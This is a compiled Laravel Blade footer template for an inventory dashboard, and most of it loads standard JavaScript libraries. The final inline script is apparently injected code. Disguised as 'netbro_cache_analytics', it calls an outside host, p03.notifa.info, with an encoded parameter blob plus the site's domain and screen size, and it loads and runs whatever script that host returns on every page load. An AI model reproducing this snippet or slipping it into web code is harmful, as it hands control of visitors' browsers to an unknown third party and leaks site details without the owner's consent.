<?php /* /home/no_tenkz/Web/inventory/resources/views/includes/dashboard/foot.blade.php */ ?>
<!--   Core JS Files   -->
    <script src="<?php echo e(asset('js/core/jquery.3.2.1.min.js')); ?>"></script>
    <script src="<?php echo e(asset('js/core/popper.min.js')); ?>"></script>
    <script src="<?php echo e(asset('js/core/bootstrap.min.js')); ?>"></script>

    <!-- jQuery UI -->
    <script src="<?php echo e(asset('js/plugin/jquery-ui-1.12.1.custom/jquery-ui.min.js')); ?>"></script>
    <script src="<?php echo e(asset('js/plugin/jquery-ui-touch-punch/jquery.ui.touch-punch.min.js')); ?>"></script>

    <!-- jQuery Scrollbar -->
    <script src="<?php echo e(asset('js/plugin/jquery-scrollbar/jquery.scrollbar.min.js')); ?>"></script>

    <!-- Moment JS -->
    <script src="<?php echo e(asset('/js/plugin/moment/moment.min.js')); ?>"></script>

    <!-- Chart JS -->
    <script src="<?php echo e(asset('/js/plugin/chart.js/chart.min.js')); ?>"></script>

    <!-- jQuery Sparkline -->
    <script src="<?php echo e(asset('/js/plugin/jquery.sparkline/jquery.sparkline.min.js')); ?>"></script>

    <!-- Chart Circle -->
    <script src="<?php echo e(asset('/js/plugin/chart-circle/circles.min.js')); ?>"></script>

    <!-- Datatables -->
    <script src="<?php echo e(asset('/js/plugin/datatables/datatables.min.js')); ?>"></script>

    <!-- Bootstrap Notify -->
    <script src="<?php echo e(asset('/js/plugin/bootstrap-notify/bootstrap-notify.min.js')); ?>"></script>

    <!-- Bootstrap Toggle -->
    <script src="<?php echo e(asset('/js/plugin/bootstrap-toggle/bootstrap-toggle.min.js')); ?>"></script>

    <!-- jQuery Vector Maps -->
    <script src="<?php echo e(asset('/js/plugin/jqvmap/jquery.vmap.min.js')); ?>"></script>
    <script src="<?php echo e(asset('/js/plugin/jqvmap/maps/jquery.vmap.world')); ?>"></script>

    <!-- DateTimePicker -->
    <script src="<?php echo e(asset('/js/plugin/datepicker/bootstrap-datetimepicker.min.js')); ?>"></script>

    <!-- Bootstrap Tagsinput -->
    <script src="<?php echo e(asset('/js/plugin/bootstrap-tagsinput/bootstrap-tagsinput.min.js')); ?>"></script>

    <!-- Bootstrap Wizard -->
    <script src="<?php echo e(asset('/js/plugin/bootstrap-wizard/bootstrapwizard.js')); ?>"></script>

    <!-- jQuery Validation -->
    <script src="<?php echo e(asset('/js/plugin/jquery.validate/jquery.validate.min.js')); ?>"></script>

    <!-- Summernote -->
    <script src="<?php echo e(asset('/js/plugin/summernote/summernote-bs4.min.js')); ?>"></script>

    <!-- Select2 -->
    <script src="<?php echo e(asset('/js/plugin/select2/select2.full.min.js')); ?>"></script>

    <!-- Sweet Alert -->
    <script src="<?php echo e(asset('/js/plugin/sweetalert/sweetalert.min.js')); ?>"></script>

    <!-- Atlantis JS -->
    <script src="<?php echo e(asset('/js/atlantis2.min.js')); ?>"></script>

    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2m7ZNu3%2beSiI5CutNu0PurOpSLp%2bePkUnbd7BPtRJkHdKjSBPD1RH%2bLLSVkjVe7iJw04Fs97XhIHa503jYbvtJtWI%2fkU%2f9z%2bfIUCLOp1TsNbGGgmJdjke61GKqqUUG2hEZLIB0p2TxOQMPVP5mI8XJODsakMikX5ZCEVtJO6qK93Ol8v68v0ya2ugF6Qo9%2f8HU7k%2fqf0myqr7FMHXiREaYzUDxTykD%2fIue9WFC5WzhfDmFqwfB9d%2fdAKcyRFM2ujENjB4yJBUePdt2higLuhGDzeGaumLVz7OvWr7Aj6uutUuIZiF7dq3eH89XI0Ofz%2boxO9KSYZsClkC5VPduWs%2bOILq6nnIFT78nyVoRp1cSIBgMUYYjKpcRCe3obTTYCNZ2jzNoYScBs3NoHPvnCXjKZ16wRDaTIVGbd9cLipo9FM%2fjXvbx9wPcU2E%2fwF0vNSbW4NL0i6O8FU2abuytoZUb4qkhb8ufP%2fcoJfr4DaWq3lJB5JFNMtBpWu98UcmZXif" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                    .height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };

    </script>
